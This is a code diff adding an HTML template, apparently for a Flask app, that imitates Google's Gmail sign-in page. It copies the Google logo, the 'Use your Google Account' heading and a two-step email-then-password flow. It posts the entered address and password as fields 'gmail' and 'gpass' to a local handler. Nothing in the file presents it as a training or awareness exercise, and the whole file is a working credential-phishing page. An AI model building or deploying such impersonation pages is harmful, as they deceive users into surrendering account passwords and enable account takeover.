@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Gmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="{{ url_for('static', filename='gmail.css') }}" />
+    <style>
+        /* Add some basic styling for demonstration */
+        .container { max-width: 400px; margin: auto; }
+        .hidden { display: none; }
+        .input-label { display: block; margin-top: 10px; }
+        .btn-group { display: flex; justify-content: space-between; margin-top: 20px; }
+        .link-btn {
+            float: right; /* Float the "Forgot Email?" link to the right */
+            margin-top: 5px; /* Adjust the margin to align with the button */
+        }
+
+        .next-btn {
+            float: right; /* Float the "Next" button to the right */
+            margin-top: 5px; /* Adjust the margin to align with the link */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-content">
+            <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google Logo">
+            <h2>Sign in</h2>
+            <p class="heading">Use your Google Account</p>
+        </div>
+        <form id="loginForm" action="gmail_login.html" method="POST">
+            <div id="emailStep">
+                <div class="inputs">
+                    <input type="email" name="gmail" id="email" class="input" required>
+                    <label for="email" class="input-label">Email or phone</label>
+                </div>
+                <a href="" class="link-btn">Forgot Email?</a>
+                <div class="btn-group">
+                    <button type="button" class="next-btn" onclick="showPasswordStep()">Next</button>
+                </div>
+            </div>
+            <div id="passwordStep" class="hidden">
+                <div class="inputs">
+                    <input type="password" name="gpass" id="password" class="input" required>
+                    <label for="password" class="input-label">Password</label>
+                </div>
+                <a href="" class="link-btn">Forgot password?</a>
+                <div class="btn-group">
+                    <button type="button" class="back-btn" onclick="showEmailStep()">Back</button>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </div>
+            <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+            <a href="" class="link-btn">Learn More</a>
+        </form>
+    </div>
+
+    <script>
+        function showPasswordStep() {
+            document.getElementById('emailStep').classList.add('hidden');
+            document.getElementById('passwordStep').classList.remove('hidden');
+        }
+
+        function showEmailStep() {
+            document.getElementById('emailStep').classList.remove('hidden');
+            document.getElementById('passwordStep').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
